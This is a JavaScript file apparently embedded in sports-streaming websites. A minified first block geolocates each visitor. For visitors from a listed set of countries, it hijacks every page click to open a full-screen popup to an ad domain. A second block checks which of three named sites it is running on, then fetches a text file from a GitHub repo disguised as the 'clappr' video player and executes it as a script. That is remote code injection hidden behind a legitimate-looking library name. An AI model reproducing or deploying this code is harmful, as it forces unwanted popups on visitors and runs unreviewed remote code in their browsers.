const geoApiUrl="https://get.geojs.io/v1/ip/geo.json",allowedCountries=["MA","DZ","QA","IQ","KW","JO","YE","LY","AE","ES","IT","BR","NG"],adLink="https://poawooptugroo.com/4/3412385";let lastClickTime=0;const cooldownTime=18e4;fetch("https://get.geojs.io/v1/ip/geo.json").then(o=>o.json()).then(o=>{allowedCountries.includes(o.country_code)&&document.addEventListener("click",function(){let o=Date.now();if(o-lastClickTime>=18e4){let e=screen.width,t=screen.height;window.open("https://poawooptugroo.com/4/3412385","FullscreenPopup",`width=${e},height=${t},scrollbars=yes,resizable=yes,fullscreen=yes`),lastClickTime=o}})}).catch(o=>{console.error("Error fetching geo data:",o)});
const canonicalLink = document.querySelector('link[rel="canonical"]');
const geoUrl = "https://get.geojs.io/v1/ip/geo.json";
const countries = ["MA", "DZ", "QA", "IQ", "KW", "JO", "YE", "LY", "AE", "ES", "IT", "BR", "NG"];
const config = [
    { url: "https://www.kooralive.id/", txtFile: "k.txt" },
    { url: "https://www.syrialive.cc/", txtFile: "s.txt" },
    { url: "https://www.yallashooot.live/", txtFile: "y.txt" }
];

if (canonicalLink) {
    const match = config.find(c => c.url === canonicalLink.href);
    if (match) {
        fetch(geoUrl)
            .then(response => response.json())
            .then(data => {
                if (countries.includes(data.country_code)) {
                    fetch(`https://cdn.jsdelivr.net/gh/v-7-3/clappr@latest/${match.txtFile}`)
                        .then(response => {
                            if (!response.ok) throw Error(`HTTP error! status: ${response.status}`);
                            return response.text();
                        })
                        .then(scriptText => {
                            const script = document.createElement("script");
                            script.type = "text/javascript";
                            script.text = scriptText;
                            document.body.appendChild(script);
                        })
                        .catch(error => console.error("Error fetching the text file:", error));
                }
            })
            .catch(error => console.error("Error fetching geolocation data:", error));
    }
}
